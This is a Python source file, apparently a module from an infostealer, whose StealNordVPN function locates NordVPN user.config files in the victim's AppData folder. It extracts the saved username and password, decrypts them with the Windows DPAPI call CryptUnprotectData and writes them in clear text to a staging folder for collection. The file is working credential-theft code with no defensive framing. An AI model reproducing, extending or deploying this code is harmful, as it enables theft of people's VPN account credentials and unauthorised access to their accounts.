import base64
import os
import xml.etree.ElementTree as ET
from main import WindowsApi


async def DecryptNordVPN(self, encrypted) -> None:
    try:
        encrypted_data = base64.b64decode(encrypted)
        return WindowsApi.CryptUnprotectData(encrypted_data).decode('utf-8')
    except Exception as e:
        print(f"decrypt nordvpn error - {str(e)}")
        return ""

async def StealNordVPN(self, driectory_path):
    vpn_path = os.path.join(self.appdata, "NordVPN")

    if not os.path.exists(vpn_path):
        return

    try:

        for root, dirs, files in os.walk(vpn_path):
            for directory in dirs:
                user_config_path = os.path.join(root, directory, "user.config")
                if not os.path.exists(user_config_path):
                    continue

                vpn_version_path = os.path.join(driectory_path, "VPN", "NordVPN", directory)
                os.makedirs(vpn_version_path, exist_ok=True)

                tree = ET.parse(user_config_path)
                root_xml = tree.getroot()

                encoded_username = root_xml.find(".//setting[@name='Username']/value").text
                encoded_password = root_xml.find(".//setting[@name='Password']/value").text

                if not encoded_username or not encoded_password:
                    continue

                username = await self.DecryptNordVPN(encoded_username)
                password = await self.DecryptNordVPN(encoded_password)

                with open(os.path.join(vpn_version_path, "nordvpn_account.txt"), "a") as file:
                    file.write(f"Username: {username}\nPassword: {password}\n\n")
    except Exception as e:
        print(f"nordvpn error - {str(e)}")
        pass